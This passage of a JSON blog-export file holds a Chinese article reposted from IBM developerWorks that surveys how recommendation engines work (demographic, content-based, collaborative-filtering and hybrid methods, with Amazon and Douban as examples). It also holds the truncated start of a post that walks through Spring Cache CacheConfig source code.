alt=\"\"></p>\n<p>当你在豆瓣电影中将一些你看过的或是感兴趣的电影加入你看过和想看的列表里，并为它们做相应的评分，这时豆瓣的推荐引擎已经拿到你的一些偏好信息，那么它将给你展示如图 8 的电影推荐。</p>\n<h5><a id=\"_9_____203\"></a>图 9 . 豆瓣的推荐机制 - 基于用户品味的推荐</h5>\n<p><img src=\"https://ws3.sinaimg.cn/large/006tNbRwly1fxeus8skwsg30az099t97.gif\" alt=\"\"></p>\n<p>豆瓣的推荐是通过“豆瓣猜”，为了让用户清楚这些推荐是如何来的，豆瓣还给出了“豆瓣猜”的一个简要的介绍。</p>\n<p>*“<em><em>你的个人推荐是根据你的收藏和评价自动得出的，每个人的推荐清单都不同。你的收藏和评价越多，豆瓣给你的推荐会越准确和丰富。</em><br>\n<em>每天推荐的内容可能会有变化。随着豆瓣的长大，给你推荐的内容也会越来越准。</em>*”</em></p>\n<p>这一点让我们可以清晰明了的知道，豆瓣必然是基于社会化的协同过滤的推荐，这样用户越多，用户的反馈越多，那么推荐的效果会越来越准确。</p>\n<p>相对于 Amazon 的用户行为模型，豆瓣电影的模型更加简单，就是“看过”和“想看”，这也让他们的推荐更加专注于用户的品味，毕竟买东西和看电影的动机还是有很大不同的。</p>\n<p>另外，豆瓣也有基于物品本身的推荐，当你查看一些电影的详细信息的时候，他会给你推荐出“喜欢这个电影的人也喜欢的电影”， 如图 10，这是一个基于协同过滤的应用。</p>\n<h5><a id=\"_10_____218\"></a>图 10 . 豆瓣的推荐机制 - 基于电影本身的推荐</h5>\n<p><img src=\"https://ws4.sinaimg.cn/large/006tNbRwly1fxeuu8jn2fg309w05jt92.gif\" alt=\"\"></p>\n<h2><a id=\"_222\"></a>总结</h2>\n<p>在网络数据爆炸的年代，如何让用户更快的找到想要的数据，如何让用户发现自己潜在的兴趣和需求，无论是对于电子商务还是社会网络的应用都是至关重要的。推荐引擎的出现，使得这个问题越来越被大家关注。但对大多数人来讲，也许还在惊叹它为什么总是能猜到你到底想要些什么。推荐引擎的魔力在于你不清楚在这个推荐背后，引擎到底记录和推理了些什么。</p>\n<p>通过这篇综述性的文章，你可以了解，其实推荐引擎只是默默的记录和观察你的一举一动，然后再借由所有用户产生的海量数据分析和发现其中的规律，进而慢慢的了解你，你的需求，你的习惯，并默默的无声息的帮助你快速的解决你的问题，找到你想要的东西。</p>\n<p>其实，回头想想，很多时候，推荐引擎比你更了解你自己。</p>\n<p>通过第一篇文章，相信大家对推荐引擎有一个清晰的第一印象，本系列的下一篇文章将深入介绍基于协同过滤的推荐策略。在现今的推荐技术和算法中，最被大家广泛认可和采用的就是基于协同过滤的推荐方法。它以其方法模型简单，数据依赖性低，数据方便采集，推荐效果较优等多个优点成为大众眼里的推荐算法“No.1”。本文将带你深入了解协同过滤的秘密，并给出基于 Apache Mahout 的协同过滤算法的高效实现。Apache Mahout 是 ASF 的一个较新的开源项目，它源于 Lucene，构建在 Hadoop 之上，关注海量数据上的机器学习经典算法的高效实现。</p>\n<p>感谢大家对本系列的关注和支持。</p>\n\n",
			"markdowncontent":"> 内容转载自: [推荐引擎初探](https://www.ibm.com/developerworks/cn/web/1103_zhaoct_recommstudy1/index.html?ca=drs-)\n\n“探索推荐引擎内部的秘密”系列将带领读者从浅入深的学习探索推荐引擎的机制，实现方法，其中还涉及一些基本的优化方法，例如聚类和分类的应用。同时在理论讲解的基础上，还会结合 Apache Mahout 介绍如何在大规模数据上实现各种推荐策略，进行策略优化，构建高效的推荐引擎的方法。本文作为这个系列的第一篇文章，将深入介绍推荐引擎的工作原理，和其中涉及的各种推荐机制，以及它们各自的优缺点和适用场景，帮助用户清楚的了解和快速构建适合自己的推荐引擎。\n\n## 信息发现\n\n如今已经进入了一个数据爆炸的时代，随着 Web 2.0 的发展， Web 已经变成数据分享的平台，那么，如何让人们在海量的数据中想要找到他们需要的信息将变得越来越难。\n\n在这样的情形下，搜索引擎（Google，Bing，百度等等）成为大家快速找到目标信息的最好途径。在用户对自己需求相对明确的时候，用搜索引擎很方便的通过关键字搜索很快的找到自己需要的信息。但搜索引擎并不能完全满足用户对信息发现的需求，那是因为在很多情况下，用户其实并不明确自己的需要，或者他们的需求很难用简单的关键字来表述。又或者他们需要更加符合他们个人口味和喜好的结果，因此出现了推荐系统，与搜索引擎对应，大家也习惯称它为推荐引擎。\n\n随着推荐引擎的出现，用户获取信息的方式从简单的目标明确的数据的搜索转换到更高级更符合人们使用习惯的信息发现。\n\n如今，随着推荐技术的不断发展，推荐引擎已经在电子商务 (E-commerce，例如 Amazon，当当网 ) 和一些基于 social 的社会化站点 ( 包括音乐，电影和图书分享，例如豆瓣，Mtime 等 ) 都取得很大的成功。这也进一步的说明了，Web2.0 环境下，在面对海量的数据，用户需要这种更加智能的，更加了解他们需求，口味和喜好的信息发现机制。\n\n## 推荐引擎\n\n前面介绍了推荐引擎对于现在的 Web2.0 站点的重要意义，这一章我们将讲讲推荐引擎到底是怎么工作的。推荐引擎利用特殊的信息过滤技术，将不同的物品或内容推荐给可能对它们感兴趣的用户。\n\n##### 图 1. 推荐引擎工作原理图\n\n![](https://ws2.sinaimg.cn/large/006tNbRwly1fxeupzmnq5j30b7088wet.jpg)\n\n图 1 给出了推荐引擎的工作原理图，这里先将推荐引擎看作黑盒，它接受的输入是推荐的数据源，一般情况下，推荐引擎所需要的数据源包括：\n\n- 要推荐物品或内容的元数据，例如关键字，基因描述等；\n- 系统用户的基本信息，例如性别，年龄等\n- 用户对物品或者信息的偏好，根据应用本身的不同，可能包括用户对物品的评分，用户查看物品的记录，用户的购买记录等。其实这些用户的偏好信息可以分为两类：\n\n- 显式的用户反馈：这类是用户在网站上自然浏览或者使用网站以外，显式的提供反馈信息，例如用户对物品的评分，或者对物品的评论。\n- 隐式的用户反馈：这类是用户在使用网站是产生的数据，隐式的反应了用户对物品的喜好，例如用户购买了某物品，用户查看了某物品的信息等等。\n\n显式的用户反馈能准确的反应用户对物品的真实喜好，但需要用户付出额外的代价，而隐式的用户行为，通过一些分析和处理，也能反映用户的喜好，只是数据不是很精确，有些行为的分析存在较大的噪音。但只要选择正确的行为特征，隐式的用户反馈也能得到很好的效果，只是行为特征的选择可能在不同的应用中有很大的不同，例如在电子商务的网站上，购买行为其实就是一个能很好表现用户喜好的隐式反馈。\n\n推荐引擎根据不同的推荐机制可能用到数据源中的一部分，然后根据这些数据，分析出一定的规则或者直接对用户对其他物品的喜好进行预测计算。这样推荐引擎可以在用户进入的时候给他推荐他可能感兴趣的物品。\n\n## 推荐引擎的分类\n\n推荐引擎的分类可以根据很多指标，下面我们一一介绍一下：\n\n1. 推荐引擎是不是为不同的用户推荐不同的数据\n\n   根据这个指标，推荐引擎可以分为基于大众行为的推荐引擎和个性化推荐引擎\n\n   - 根据大众行为的推荐引擎，对每个用户都给出同样的推荐，这些推荐可以是静态的由系统管理员人工设定的，或者基于系统所有用户的反馈统计计算出的当下比较流行的物品。\n   - 个性化推荐引擎，对不同的用户，根据他们的口味和喜好给出更加精确的推荐，这时，系统需要了解需推荐内容和用户的特质，或者基于社会化网络，通过找到与当前用户相同喜好的用户，实现推荐。\n\n   这是一个最基本的推荐引擎分类，其实大部分人们讨论的推荐引擎都是将个性化的推荐引擎，因为从根本上说，只有个性化的推荐引擎才是更加智能的信息发现过程。\n\n2. 根据推荐引擎的数据源\n\n   其实这里讲的是如何发现数据的相关性，因为大部分推荐引擎的工作原理还是基于物品或者用户的相似集进行推荐。那么参考图 1 给出的推荐系统原理图，根据不同的数据源发现数据相关性的方法可以分为以下几种：\n\n   - 根据系统用户的基本信息发现用户的相关程度，这种被称为基于人口统计学的推荐（Demographic-based Recommendation）\n   - 根据推荐物品或内容的元数据，发现物品或者内容的相关性，这种被称为基于内容的推荐（Content-based Recommendation）\n   - 根据用户对物品或者信息的偏好，发现物品或者内容本身的相关性，或者是发现用户的相关性，这种被称为基于协同过滤的推荐（Collaborative Filtering-based Recommendation）。\n\n3. 根据推荐模型的建立方式\n\n   可以想象在海量物品和用户的系统中，推荐引擎的计算量是相当大的，要实现实时的推荐务必需要建立一个推荐模型，关于推荐模型的建立方式可以分为以下几种：\n\n   - 基于物品和用户本身的，这种推荐引擎将每个用户和每个物品都当作独立的实体，预测每个用户对于每个物品的喜好程度，这些信息往往是用一个二维矩阵描述的。由于用户感兴趣的物品远远小于总物品的数目，这样的模型导致大量的数据空置，即我们得到的二维矩阵往往是一个很大的稀疏矩阵。同时为了减小计算量，我们可以对物品和用户进行聚类， 然后记录和计算一类用户对一类物品的喜好程度，但这样的模型又会在推荐的准确性上有损失。\n   - 基于关联规则的推荐（Rule-based Recommendation）：关联规则的挖掘已经是数据挖掘中的一个经典的问题，主要是挖掘一些数据的依赖关系，典型的场景就是“购物篮问题”，通过关联规则的挖掘，我们可以找到哪些物品经常被同时购买，或者用户购买了一些物品后通常会购买哪些其他的物品，当我们挖掘出这些关联规则之后，我们可以基于这些规则给用户进行推荐。\n   - 基于模型的推荐（Model-based Recommendation）：这是一个典型的机器学习的问题，可以将已有的用户喜好信息作为训练样本，训练出一个预测用户喜好的模型，这样以后用户在进入系统，可以基于此模型计算推荐。这种方法的问题在于如何将用户实时或者近期的喜好信息反馈给训练好的模型，从而提高推荐的准确度。\n\n其实在现在的推荐系统中，很少有只使用了一个推荐策略的推荐引擎，一般都是在不同的场景下使用不同的推荐策略从而达到最好的推荐效果，例如 Amazon 的推荐，它将基于用户本身历史购买数据的推荐，和基于用户当前浏览的物品的推荐，以及基于大众喜好的当下比较流行的物品都在不同的区域推荐给用户，让用户可以从全方位的推荐中找到自己真正感兴趣的物品。\n\n## 深入推荐机制\n\n这一章的篇幅，将详细介绍各个推荐机制的工作原理，它们的优缺点以及应用场景。\n\n### 基于人口统计学的推荐\n\n基于人口统计学的推荐机制（Demographic-based Recommendation）是一种最易于实现的推荐方法，它只是简单的根据系统用户的基本信息发现用户的相关程度，然后将相似用户喜爱的其他物品推荐给当前用户，图 2 给出了这种推荐的工作原理。\n\n##### 图 2. 基于人口统计学的推荐机制的工作原理\n\n![](https://ws1.sinaimg.cn/large/006tNbRwly1fxeuqjca50j309r05x74m.jpg)\n\n从图中可以很清楚的看到，首先，系统对每个用户都有一个用户 Profile 的建模，其中包括用户的基本信息，例如用户的年龄，性别等等；然后，系统会根据用户的 Profile 计算用户的相似度，可以看到用户 A 的 Profile 和用户 C 一样，那么系统会认为用户 A 和 C 是相似用户，在推荐引擎中，可以称他们是“邻居”；最后，基于“邻居”用户群的喜好推荐给当前用户一些物品，图中将用户 A 喜欢的物品 A 推荐给用户 C。\n\n这种基于人口统计学的推荐机制的好处在于：\n\n1. 因为不使用当前用户对物品的喜好历史数据，所以对于新用户来讲没有“冷启动（Cold Start）”的问题。\n2. 这个方法不依赖于物品本身的数据，所以这个方法在不同物品的领域都可以使用，它是领域独立的（domain-independent）。\n\n那么这个方法的缺点和问题是什么呢？这种基于用户的基本信息对用户进行分类的方法过于粗糙，尤其是对品味要求较高的领域，比如图书，电影和音乐等领域，无法得到很好的推荐效果。可能在一些电子商务的网站中，这个方法可以给出一些简单的推荐。另外一个局限是，这个方法可能涉及到一些与信息发现问题本身无关却比较敏感的信息，比如用户的年龄等，这些用户信息不是很好获取。\n\n### 基于内容的推荐\n\n基于内容的推荐是在推荐引擎出现之初应用最为广泛的推荐机制，它的核心思想是根据推荐物品或内容的元数据，发现物品或者内容的相关性，然后基于用户以往的喜好记录，推荐给用户相似的物品。图 3 给出了基于内容推荐的基本原理。\n\n##### 图 3. 基于内容推荐机制的基本原理\n\n![](https://ws4.sinaimg.cn/large/006tNbRwly1fxeuqv882aj309x064q2z.jpg)\n\n图 3 中给出了基于内容推荐的一个典型的例子，电影推荐系统，首先我们需要对电影的元数据有一个建模，这里只简单的描述了一下电影的类型；然后通过电影的元数据发现电影间的相似度，因为类型都是“爱情，浪漫”电影 A 和 C 被认为是相似的电影（当然，只根据类型是不够的，要得到更好的推荐，我们还可以考虑电影的导演，演员等等）；最后实现推荐，对于用户 A，他喜欢看电影 A，那么系统就可以给他推荐类似的电影 C。\n\n这种基于内容的推荐机制的好处在于它能很好的建模用户的口味，能提供更加精确的推荐。但它也存在以下几个问题：\n\n1. 需要对物品进行分析和建模，推荐的质量依赖于对物品模型的完整和全面程度。在现在的应用中我们可以观察到关键词和标签（Tag）被认为是描述物品元数据的一种简单有效的方法。\n2. 物品相似度的分析仅仅依赖于物品本身的特征，这里没有考虑人对物品的态度。\n3. 因为需要基于用户以往的喜好历史做出推荐，所以对于新用户有“冷启动”的问题。\n\n虽然这个方法有很多不足和问题，但他还是成功的应用在一些电影，音乐，图书的社交站点，有些站点还请专业的人员对物品进行基因编码，比如潘多拉，在一份报告中说道，在潘多拉的推荐引擎中，每首歌有超过 100 个元数据特征，包括歌曲的风格，年份，演唱者等等。\n\n### 基于协同过滤的推荐\n\n随着 Web2.0 的发展，Web 站点更加提倡用户参与和用户贡献，因此基于协同过滤的推荐机制因运而生。它的原理很简单，就是根据用户对物品或者信息的偏好，发现物品或者内容本身的相关性，或者是发现用户的相关性，然后再基于这些关联性进行推荐。基于协同过滤的推荐可以分为三个子类：基于用户的推荐（User-based Recommendation），基于项目的推荐（Item-based Recommendation）和基于模型的推荐（Model-based Recommendation）。下面我们一个一个详细的介绍着三种协同过滤的推荐机制。\n\n**基于用户的协同过滤推荐**\n\n基于用户的协同过滤推荐的基本原理是，根据所有用户对物品或者信息的偏好，发现与当前用户口味和偏好相似的“邻居”用户群，在一般的应用中是采用计算“K- 邻居”的算法；然后，基于这 K 个邻居的历史偏好信息，为当前用户进行推荐。下图 4 给出了原理图。\n\n##### 图 4. 基于用户的协同过滤推荐机制的基本原理\n\n![](https://ws3.sinaimg.cn/large/006tNbRwly1fxeur7z2kij307z05u749.jpg)\n\n上图示意出基于用户的协同过滤推荐机制的基本原理，假设用户 A 喜欢物品 A，物品 C，用户 B 喜欢物品 B，用户 C 喜欢物品 A ，物品 C 和物品 D；从这些用户的历史喜好信息中，我们可以发现用户 A 和用户 C 的口味和偏好是比较类似的，同时用户 C 还喜欢物品 D，那么我们可以推断用户 A 可能也喜欢物品 D，因此可以将物品 D 推荐给用户 A。\n\n基于用户的协同过滤推荐机制和基于人口统计学的推荐机制都是计算用户的相似度，并基于“邻居”用户群计算推荐，但它们所不同的是如何计算用户的相似度，基于人口统计学的机制只考虑用户本身的特征，而基于用户的协同过滤机制可是在用户的历史偏好的数据上计算用户的相似度，它的基本假设是，喜欢类似物品的用户可能有相同或者相似的口味和偏好。\n\n**基于项目的协同过滤推荐**\n\n基于项目的协同过滤推荐的基本原理也是类似的，只是说它使用所有用户对物品或者信息的偏好，发现物品和物品之间的相似度，然后根据用户的历史偏好信息，将类似的物品推荐给用户，图 5 很好的诠释了它的基本原理。\n\n假设用户 A 喜欢物品 A 和物品 C，用户 B 喜欢物品 A，物品 B 和物品 C，用户 C 喜欢物品 A，从这些用户的历史喜好可以分析出物品 A 和物品 C 时比较类似的，喜欢物品 A 的人都喜欢物品 C，基于这个数据可以推断用户 C 很有可能也喜欢物品 C，所以系统会将物品 C 推荐给用户 C。\n\n与上面讲的类似，基于项目的协同过滤推荐和基于内容的推荐其实都是基于物品相似度预测推荐，只是相似度计算的方法不一样，前者是从用户历史的偏好推断，而后者是基于物品本身的属性特征信息。\n\n##### 图 5. 基于项目的协同过滤推荐机制的基本原理\n\n![](https://ws3.sinaimg.cn/large/006tNbRwly1fxeurim8t1j308d05xjrc.jpg)\n\n同时协同过滤，在基于用户和基于项目两个策略中应该如何选择呢？其实基于项目的协同过滤推荐机制是 Amazon 在基于用户的机制上改良的一种策略，因为在大部分的 Web 站点中，物品的个数是远远小于用户的数量的，而且物品的个数和相似度相对比较稳定，同时基于项目的机制比基于用户的实时性更好一些。但也不是所有的场景都是这样的情况，可以设想一下在一些新闻推荐系统中，也许物品，也就是新闻的个数可能大于用户的个数，而且新闻的更新程度也有很快，所以它的形似度依然不稳定。所以，其实可以看出，推荐策略的选择其实和具体的应用场景有很大的关系。\n\n**基于模型的协同过滤推荐**\n\n基于模型的协同过滤推荐就是基于样本的用户喜好信息，训练一个推荐模型，然后根据实时的用户喜好的信息进行预测，计算推荐。\n\n基于协同过滤的推荐机制是现今应用最为广泛的推荐机制，它有以下几个显著的优点：\n\n1. 它不需要对物品或者用户进行严格的建模，而且不要求物品的描述是机器可理解的，所以这种方法也是领域无关的。\n2. 这种方法计算出来的推荐是开放的，可以共用他人的经验，很好的支持用户发现潜在的兴趣偏好\n\n而它也存在以下几个问题：\n\n1. 方法的核心是基于历史数据，所以对新物品和新用户都有“冷启动”的问题。\n2. 推荐的效果依赖于用户历史偏好数据的多少和准确性。\n3. 在大部分的实现中，用户历史偏好是用稀疏矩阵进行存储的，而稀疏矩阵上的计算有些明显的问题，包括可能少部分人的错误偏好会对推荐的准确度有很大的影响等等。\n4. 对于一些特殊品味的用户不能给予很好的推荐。\n5. 由于以历史数据为基础，抓取和建模用户的偏好后，很难修改或者根据用户的使用演变，从而导致这个方法不够灵活。\n\n### 混合的推荐机制\n\n在现行的 Web 站点上的推荐往往都不是单纯只采用了某一种推荐的机制和策略，他们往往是将多个方法混合在一起，从而达到更好的推荐效果。关于如何组合各个推荐机制，这里讲几种比较流行的组合方法。\n\n1. 加权的混合（Weighted Hybridization）: 用线性公式（linear formula）将几种不同的推荐按照一定权重组合起来，具体权重的值需要在测试数据集上反复实验，从而达到最好的推荐效果。\n2. 切换的混合（Switching Hybridization）：前面也讲到，其实对于不同的情况（数据量，系统运行状况，用户和物品的数目等），推荐策略可能有很大的不同，那么切换的混合方式，就是允许在不同的情况下，选择最为合适的推荐机制计算推荐。\n3. 分区的混合（Mixed Hybridization）：采用多种推荐机制，并将不同的推荐结果分不同的区显示给用户。其实，Amazon，当当网等很多电子商务网站都是采用这样的方式，用户可以得到很全面的推荐，也更容易找到他们想要的东西。\n4. 分层的混合（Meta-Level Hybridization）: 采用多种推荐机制，并将一个推荐机制的结果作为另一个的输入，从而综合各个推荐机制的优缺点，得到更加准确的推荐。\n\n## 推荐引擎的应用\n\n介绍完推荐引擎的基本原理，基本推荐机制，下面简要分析几个有代表性的推荐引擎的应用，这里选择两个领域：Amazon 作为电子商务的代表，豆瓣作为社交网络的代表。\n\n**推荐在电子商务中的应用 – Amazon**\n\nAmazon 作为推荐引擎的鼻祖，它已经将推荐的思想渗透在应用的各个角落。Amazon 推荐的核心是通过数据挖掘算法和比较用户的消费偏好于其他用户进行对比，借以预测用户可能感兴趣的商品。对应于上面介绍的各种推荐机制，Amazon 采用的是分区的混合的机制，并将不同的推荐结果分不同的区显示给用户，图 6 和图 7 展示了用户在 Amazon 上能得到的推荐。\n\n##### 图 6. Amazon 的推荐机制 - 首页\n\n![](https://ws3.sinaimg.cn/large/006tNbRwly1fxeurryh2ag30e7095js5.gif)\n\n##### 图 7. Amazon 的推荐机制 - 浏览物品\n\n![](https://ws2.sinaimg.cn/large/006tNbRwly1fxeurwn1iig30d709f0tf.gif)\n\nAmazon 利用可以记录的所有用户在站点上的行为，根据不同数据的特点对它们进行处理，并分成不同区为用户推送推荐：\n\n- 今日推荐 (Today's Recommendation For You): 通常是根据用户的近期的历史购买或者查看记录，并结合时下流行的物品给出一个折中的推荐。\n- 新产品的推荐 (New For You): 采用了基于内容的推荐机制 (Content-based Recommendation)，将一些新到物品推荐给用户。在方法选择上由于新物品没有大量的用户喜好信息，所以基于内容的推荐能很好的解决这个“冷启动”的问题。\n- 捆绑销售 (Frequently Bought Together): 采用数据挖掘技术对用户的购买行为进行分析，找到经常被一起或同一个人购买的物品集，进行捆绑销售，这是一种典型的基于项目的协同过滤推荐机制。\n- 别人购买 / 浏览的商品 (Customers Who Bought/See This Item Also Bought/See): 这也是一个典型的基于项目的协同过滤推荐的应用，通过社会化机制用户能更快更方便的找到自己感兴趣的物品。\n\n值得一提的是，Amazon 在做推荐时，设计和用户体验也做得特别独到：\n\nAmazon 利用有它大量历史数据的优势，量化推荐原因。\n\n- 基于社会化的推荐，Amazon 会给你事实的数据，让用户信服，例如：购买此物品的用户百分之多少也购买了那个物品；\n- 基于物品本身的推荐，Amazon 也会列出推荐的理由，例如：因为你的购物框中有 ***，或者因为你购买过 ***，所以给你推荐类似的 ***。\n\n另外，Amazon 很多推荐是基于用户的 profile 计算出来的，用户的 profile 中记录了用户在 Amazon 上的行为，包括看了那些物品，买了那些物品，收藏夹和 wish list 里的物品等等，当然 Amazon 里还集成了评分等其他的用户反馈的方式，它们都是 profile 的一部分，同时，Amazon 提供了让用户自主管理自己 profile 的功能，通过这种方式用户可以更明确的告诉推荐引擎他的品味和意图是什么。\n\n**推荐在社交网站中的应用 – 豆瓣**\n\n豆瓣是国内做的比较成功的社交网站，它以图书，电影，音乐和同城活动为中心，形成一个多元化的社交网络平台，自然推荐的功能是必不可少的，下面我们看看豆瓣是如何推荐的。\n\n##### 图 8 . 豆瓣的推荐机制 - 豆瓣电影\n\n![](https://ws3.sinaimg.cn/large/006tNbRwly1fxeus35ywbg309c077mxh.gif)\n\n当你在豆瓣电影中将一些你看过的或是感兴趣的电影加入你看过和想看的列表里，并为它们做相应的评分，这时豆瓣的推荐引擎已经拿到你的一些偏好信息，那么它将给你展示如图 8 的电影推荐。\n\n##### 图 9 . 豆瓣的推荐机制 - 基于用户品味的推荐\n\n![](https://ws3.sinaimg.cn/large/006tNbRwly1fxeus8skwsg30az099t97.gif)\n\n豆瓣的推荐是通过“豆瓣猜”，为了让用户清楚这些推荐是如何来的，豆瓣还给出了“豆瓣猜”的一个简要的介绍。\n\n*“**你的个人推荐是根据你的收藏和评价自动得出的，每个人的推荐清单都不同。你的收藏和评价越多，豆瓣给你的推荐会越准确和丰富。*\n*每天推荐的内容可能会有变化。随着豆瓣的长大，给你推荐的内容也会越来越准。**”*\n\n这一点让我们可以清晰明了的知道，豆瓣必然是基于社会化的协同过滤的推荐，这样用户越多，用户的反馈越多，那么推荐的效果会越来越准确。\n\n相对于 Amazon 的用户行为模型，豆瓣电影的模型更加简单，就是“看过”和“想看”，这也让他们的推荐更加专注于用户的品味，毕竟买东西和看电影的动机还是有很大不同的。\n\n另外，豆瓣也有基于物品本身的推荐，当你查看一些电影的详细信息的时候，他会给你推荐出“喜欢这个电影的人也喜欢的电影”， 如图 10，这是一个基于协同过滤的应用。\n\n##### 图 10 . 豆瓣的推荐机制 - 基于电影本身的推荐\n\n![](https://ws4.sinaimg.cn/large/006tNbRwly1fxeuu8jn2fg309w05jt92.gif)\n\n## 总结\n\n在网络数据爆炸的年代，如何让用户更快的找到想要的数据，如何让用户发现自己潜在的兴趣和需求，无论是对于电子商务还是社会网络的应用都是至关重要的。推荐引擎的出现，使得这个问题越来越被大家关注。但对大多数人来讲，也许还在惊叹它为什么总是能猜到你到底想要些什么。推荐引擎的魔力在于你不清楚在这个推荐背后，引擎到底记录和推理了些什么。\n\n通过这篇综述性的文章，你可以了解，其实推荐引擎只是默默的记录和观察你的一举一动，然后再借由所有用户产生的海量数据分析和发现其中的规律，进而慢慢的了解你，你的需求，你的习惯，并默默的无声息的帮助你快速的解决你的问题，找到你想要的东西。\n\n其实，回头想想，很多时候，推荐引擎比你更了解你自己。\n\n通过第一篇文章，相信大家对推荐引擎有一个清晰的第一印象，本系列的下一篇文章将深入介绍基于协同过滤的推荐策略。在现今的推荐技术和算法中，最被大家广泛认可和采用的就是基于协同过滤的推荐方法。它以其方法模型简单，数据依赖性低，数据方便采集，推荐效果较优等多个优点成为大众眼里的推荐算法“No.1”。本文将带你深入了解协同过滤的秘密，并给出基于 Apache Mahout 的协同过滤算法的高效实现。Apache Mahout 是 ASF 的一个较新的开源项目，它源于 Lucene，构建在 Hadoop 之上，关注海量数据上的机器学习经典算法的高效实现。\n\n感谢大家对本系列的关注和支持。\n",
			"tags":"个性化推荐,推荐引擎",
			"id":"84310323",
			"categories":"推荐引擎,java",
			"status":1
		},
		"error":"",
		"status":true
	},
	{
		"data":{
			"date":"2018年10月09日 11:09:19",
			"articleedittype":1,
			"private":0,
			"channel":"31",
			"description":"自定义key的CacheConfig源码剖析Cache启动初始化Cache被调用自定义CacheConfig的配置方法\nSpring cache的源码版本：spring-context-5.0.9.RELEASE.jar\n项目demo代码：点我跳转\n\n先讲自定义可以干嘛，再讲解源码：\n通过自定义cache config，可以用来设置自定义的过期时间，自定义的序列化方式，自定义前缀等等。@Cache...",
			"title":"自定义key的CacheConfig源码剖析",
			"type":"original",
			"content":"<p></p><div class=\"toc\"><h3>自定义key的CacheConfig源码剖析</h3><ul><ul><ul><li><a href=\"#Cache_10\">Cache启动初始化</a></li><li><a href=\"#Cache_77\">Cache被调用</a></li><li><a href=\"#CacheConfig_141\">自定义CacheConfig的配置方法</a></li></ul></ul></ul></div><p></p>\n<p>Spring cache的源码版本：<code>spring-context-5.0.9.RELEASE.jar</code></p>\n<p>项目demo代码：<a href=\"https://github.com/yoqu/spring-cache-demo\">点我跳转</a></p>\n<blockquote>\n<p>先讲自定义可以干嘛，再讲解源码：<br>\n通过自定义cache config，可以用来设置自定义的过期时间，自定义的序列化方式，自定义前缀等等。<code>@Cacheable</code> 注解不能设置过期时间，这点是由于cache本身是抽象，各种实现过期时间的一些具体缓存框架可能有差异，不过我觉得这是一个非常不爽的点。<br>\n所以我们来阅读源代码吧。</p>\n</blockquote>\n<h3><a id=\"Cache_10\"></a>Cache启动初始化</h3>\n<p><code>AbstractCacheManager</code>类中有一个<code>cacheMap</code>变量存储所有的缓存实现，在项目初始化时，由于类中实现了<code>InitializingBean</code>接口，所有会初始化缓存，代码：</p>\n<pre class=\" language-java\"><code class=\"prism  language-java\">\t<span class=\"token keyword\">public</span> <span class=\"token keyword\">abstract</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">AbstractCacheManager</span> <span class=\"token keyword\">implements</span> <span class=\"token class-name\">CacheManager</span><span class=\"token punctuation\">,</span> InitializingBean <span class=\"token punctuation\">{</span>\n\n\t<span class=\"token keyword\">private</span> <span class=\"token keyword\">final</span> ConcurrentMap<span class=\"token generics function\"><span class=\"token punctuation\">&lt;</span>String<span class=\"token punctuation\">,</span> Cache<span class=\"token punctuation\">&gt;</span></span> cacheMap <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ConcurrentHashMap</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">&gt;</span><span class=\"token punctuation\">(</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n\t<span class=\"token keyword\">private</span> <span class=\"token keyword\">volatile</span> Set<span class=\"token generics function\"><span class=\"token punctuation\">&lt;</span>String<span class=\"token punctuation\">&gt;</span></span> cacheNames <span class=\"token operator\">=</span> Collections<span class=\"token punctuation\">.</span><span class=\"token function\">emptySet</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n\t<span class=\"token annotation punctuation\">@Override</span>\n\t<span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">afterPropertiesSet</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t\t<span class=\"token function\">initializeCaches</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">}</span>\n\n\t<span class=\"token comment\">/**\n\t * Initialize the static configuration of caches.\n\t * &lt;p&gt;Triggered on startup through {@link #afterPropertiesSet()};\n\t * can also be called to re-initialize at runtime.\n\t * @since 4.2.2\n\t * @see #loadCaches()\n\t */</span>\n\t<span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">initializeCaches</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token comment\">// 1⃣️重点在loadCaches方法</span>\n\t\tCollection<span class=\"token operator\">&lt;</span><span class=\"token operator\">?</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">Cache</span><span class=\"token operator\">&gt;</span> caches <span class=\"token operator\">=</span> <span class=\"token function\">loadCaches</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token keyword\">synchronized</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>cacheMap<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t\t\t<span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>cacheNames <span class=\"token operator\">=</span> Collections<span class=\"token punctuation\">.</span><span class=\"token function\">emptySet</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t<span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>cacheMap<span class=\"token punctuation\">.</span><span class=\"token function\">clear</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>           \n\t\t\tSet<span class=\"token generics function\"><span class=\"token punctuation\">&lt;</span>String<span class=\"token punctuation\">&gt;</span></span> cacheNames <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">LinkedHashSet</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">&gt;</span><span class=\"token punctuation\">(</span>caches<span class=\"token punctuation\">.</span><span class=\"token function\">size</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t<span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>Cache cache <span class=\"token operator\">:</span> caches<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t\t\t\tString name <span 